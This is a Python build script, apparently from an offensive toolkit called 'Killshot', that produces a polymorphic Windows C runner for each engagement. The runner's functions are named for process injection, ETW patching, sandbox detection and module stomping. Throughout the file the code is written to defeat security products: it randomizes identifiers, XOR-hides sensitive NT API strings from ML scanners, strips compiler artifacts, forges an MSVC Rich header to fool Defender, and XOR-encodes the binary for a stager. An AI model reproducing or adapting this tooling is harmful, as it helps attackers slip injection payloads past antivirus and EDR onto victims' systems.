#!/usr/bin/env python3
"""
Killshot C Runner Builder
Generates a polymorphic C runner per engagement:
- Replaces POLY_XXX identifiers with random names
- Inserts random constants for junk functions
- Compiles with mingw-w64 (-O2 -s)
- XOR 0x5A encodes the binary → runner_c.dat

Usage:
  python3 runner_c_builder.py [-o runner_c.dat] [--src runner_src/runner_template.c]
"""

import random
import re
import string
import subprocess
import os
import sys
import shutil
import argparse
import tempfile

TEMPLATE = os.path.join(os.path.dirname(__file__), "runner_src", "runner_template.c")
CC = "x86_64-w64-mingw32-gcc"
STRIP = "x86_64-w64-mingw32-strip"
XOR_KEY = 0x5A


def rand_id(min_len=5, max_len=11):
    """Generate a plausible C identifier."""
    prefixes = ["_", "__", ""]
    prefix = random.choice(prefixes)
    first = random.choice(string.ascii_lowercase + string.ascii_uppercase)
    rest = "".join(random.choices(
        string.ascii_letters + string.digits + "_",
        k=random.randint(min_len, max_len)
    ))
    return prefix + first + rest


def build_poly_map():
    """Map every POLY_* symbol to a unique random identifier."""
    symbols = [
        "JUNK1", "JUNK2", "JUNK3",
        "CONST1", "CONST2", "CONST3", "CONST4",
        "NTDLL", "STUBS",
        "GETSSN", "INITSTUB",
        "NTALLOC", "NTWRITE", "NTPROT", "NTTHREAD",
        "NTOPEN", "NTWAIT", "NTCLOSE",
        "PATCHETW", "SANDBOX", "FINDPID",
        "FINDGADGET", "MODSTOMP",
        "INJECT", "SPAWNinject", "SELFINJECT", "LOADENC",
        "SSN_SYSINFO",
    ]
    used = set()
    mapping = {}
    for sym in symbols:
        while True:
            name = rand_id()
            if name not in used:
                used.add(name)
                mapping[sym] = name
                break
    # Constants get integer values
    mapping["CONST1"] = str(random.randint(3, 17))
    mapping["CONST2"] = str(random.randint(100, 999))
    mapping["CONST3"] = str(random.randint(10, 50))
    mapping["CONST4"] = str(random.randint(20, 80))
    return mapping


def apply_poly(source: str, mapping: dict) -> str:
    """Replace POLY_XXX with random identifiers."""
    # Sort by length descending to avoid partial replacements
    for sym, replacement in sorted(mapping.items(), key=lambda x: -len(x[0])):
        source = source.replace(f"POLY_{sym}", replacement)
    return source


# Sensitive strings that appear in .rdata and trigger ML models
_NT_STRINGS = [
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtProtectVirtualMemory",
    "NtCreateThreadEx",
    "NtOpenProcess",
    "NtWaitForSingleObject",
    "NtQuerySystemInformation",
    "NtClose",
    "EtwEventWrite",
    "ntdll.dll",
]


def obfuscate_nt_strings(source: str) -> str:
    """Replace each sensitive string literal with a GCC statement-expression
    that XOR-decodes a byte array at runtime, removing plaintext from .rdata."""
    for s in _NT_STRINGS:
        literal = f'"{s}"'
        if literal not in source:
            continue
        # Reject keys that would create an embedded NUL (ord(c) ^ key == 0 means key == ord(c))
        char_set = {ord(c) for c in s}
        while True:
            key = random.randint(0x13, 0xED) | 1
            if key not in char_set:
                break
        enc = [ord(c) ^ key for c in s]
        vn = rand_id(4, 7)
        dk = rand_id(4, 7)   # decode-once flag
        arr = ",".join(f"(char)0x{b:02X}" for b in enc)
        # GCC statement expression with static storage (no dangling-pointer warning)
        stmt = (
            f'({{static char {vn}[]={{{arr},0}};'
            f'static int {dk}=0;'
            f'if(!{dk}){{for(int _i=0;{vn}[_i];_i++){vn}[_i]^=0x{key:02X};{dk}=1;}}'
            f'{vn};}})'
        )
        source = source.replace(literal, stmt)
    return source


def add_junk_globals(source: str) -> str:
    """Insert random global declarations before main to pad binary structure."""
    junk_lines = []
    for _ in range(random.randint(3, 7)):
        name = rand_id()
        val = random.randint(1, 0xFFFF)
        junk_lines.append(f"static volatile int {name} = {val};")
    insertion = "\n".join(junk_lines) + "\n"
    # Insert before the entry point comment line
    return source.replace("/* ─── Entry point ─── */", insertion + "/* ─── Entry point ─── */")


def compile_runner(src_path: str, out_exe: str) -> bool:
    """Compile with mingw-w64."""
    cmd = [
        CC,
        "-O2", "-s",                              # optimize + strip debug
        "-Wall", "-Wno-unused-variable", "-Wno-unused-function",
        "-mno-stack-arg-probe",                    # no stack probe
        "-fno-ident",                              # no compiler version string
        "-fno-exceptions",                         # remove .eh_frame (GCC artifact)
        "-fno-asynchronous-unwind-tables",         # remove .eh_frame (GCC artifact)
        "-fno-stack-protector",                    # no __stack_chk_fail CRT dep
        "-fno-builtin-memcpy",                     # prevent compiler memcpy call gen
        "-fno-builtin-memset",                     # prevent compiler memset call gen
        "-fno-builtin-memmove",                    # prevent compiler memmove call gen
        "-Wno-dangling-pointer",                   # statement-expr static arrays are safe
        "-nostdlib",                               # remove CRT startup + api-ms-win-crt-*
        "-Wl,--no-seh",                            # disable SEH table
        "-Wl,-e,mainCRTStartup",                   # use our CRT-free entry point
        src_path,
        "-o", out_exe,
        "-lgcc",                                   # compiler runtime (no CRT imports)
        "-lkernel32",                              # only Win32 dependency needed
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[!] Compile error:\n{result.stderr}")
        return False
    print(f"[+] Compiled: {out_exe} ({os.path.getsize(out_exe):,} bytes)")
    return True


def xor_encode(data: bytes, key: int = XOR_KEY) -> bytes:
    """XOR 0x5A encode (stager will decode before writing to disk)."""
    return bytes(b ^ key for b in data)


def inject_rich_header(pe_data: bytes) -> bytes:
    """Overwrite the DOS stub area with a plausible MSVC 2022 Rich header.
    Windows loader ignores this area; Defender ML looks for its presence."""
    import struct

    pe_off = struct.unpack_from('<I', pe_data, 0x3c)[0]
    stub_start = 0x40
    avail = pe_off - stub_start  # bytes we can overwrite

    # VS 2022 v17.6 plausible product table: (prod_id, use_count)
    # prod_id high word; low word varies per build — randomise slightly
    build = random.randint(0xF800, 0xF9FF)
    products = [
        (0x0104, build, random.randint(1, 3)),   # Linker 14.3x
        (0x0105, build, random.randint(2, 6)),   # C++ compiler
        (0x00FF, build, random.randint(1, 2)),   # RC resource compiler
        (0x0103, build, random.randint(1, 2)),   # C compiler import
    ]

    # XOR key: any 32-bit value; randomise per build
    key = random.randint(0x10000000, 0xEFFFFFFF) | 0x01010101

    buf = bytearray()
    # "DanS" XOR'd with key (at offset 0 of stub area)
    buf += struct.pack('<I', 0x536E6144 ^ key)  # "DanS" LE
    # 3 padding DWORDs (zeros XOR'd with key = key)
    buf += struct.pack('<III', key, key, key)   # 3 × (0 ^ key) = key

    # Product entries: (comp_id XOR key, count XOR key)
    for prod_id, bld, cnt in products:
        comp_id = (prod_id << 16) | (bld & 0xFFFF)
        buf += struct.pack('<II', comp_id ^ key, cnt ^ key)

    # "Rich" marker + key (literal — NOT XOR'd)
    buf += b'Rich'
    buf += struct.pack('<I', key)

    if len(buf) > avail:
        print(f"[!] Rich header ({len(buf)}B) doesn't fit in {avail}B stub area; skipping")
        return pe_data

    # Pad remaining stub area with zeros
    buf += b'\x00' * (avail - len(buf))

    result = bytearray(pe_data)
    result[stub_start:pe_off] = buf
    return bytes(result)


def generate(src_template: str = TEMPLATE, output_dat: str = "runner_c.dat",
             keep_src: bool = False, keep_exe: bool = False) -> bool:
    print("[*] Building polymorphic C runner...")

    # Read template
    with open(src_template) as f:
        template = f.read()

    # Generate unique identifier map
    mapping = build_poly_map()

    # Apply polymorphism
    source = apply_poly(template, mapping)
    source = obfuscate_nt_strings(source)
    source = add_junk_globals(source)

    # Write to temp directory
    tmpdir = tempfile.mkdtemp(prefix="killshot_runner_")
    src_path = os.path.join(tmpdir, "runner.c")
    exe_path = os.path.join(tmpdir, "runner.exe")

    with open(src_path, "w") as f:
        f.write(source)

    # Compile
    if not compile_runner(src_path, exe_path):
        shutil.rmtree(tmpdir)
        return False

    # Post-process: inject fake MSVC Rich header then XOR 0x5A encode
    with open(exe_path, "rb") as f:
        raw = f.read()
    raw = inject_rich_header(raw)
    encoded = xor_encode(raw)

    abs_out = os.path.abspath(output_dat)
    with open(abs_out, "wb") as f:
        f.write(encoded)
    print(f"[+] XOR-encoded runner: {abs_out} ({len(encoded):,} bytes)")

    # Optionally keep intermediate files
    if keep_src:
        shutil.copy(src_path, output_dat.replace(".dat", ".c"))
        print(f"[*] Source saved: {output_dat.replace('.dat', '.c')}")
    if keep_exe:
        # Save the post-inject (Rich header patched) binary
        out_exe_path = abs_out.replace(".dat", ".exe")
        with open(out_exe_path, "wb") as f:
            f.write(raw)
        print(f"[*] EXE saved: {out_exe_path}")

    shutil.rmtree(tmpdir)
    return True


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Killshot C Runner Builder")
    parser.add_argument("-o", "--output", default="runner_c.dat",
                        help="Output XOR-encoded runner (default: runner_c.dat)")
    parser.add_argument("--src", default=TEMPLATE,
                        help="Runner template C file")
    parser.add_argument("--keep-src", action="store_true",
                        help="Save generated .c alongside output")
    parser.add_argument("--keep-exe", action="store_true",
                        help="Save compiled .exe alongside output")
    args = parser.parse_args()

    ok = generate(args.src, args.output, args.keep_src, args.keep_exe)
    sys.exit(0 if ok else 1)
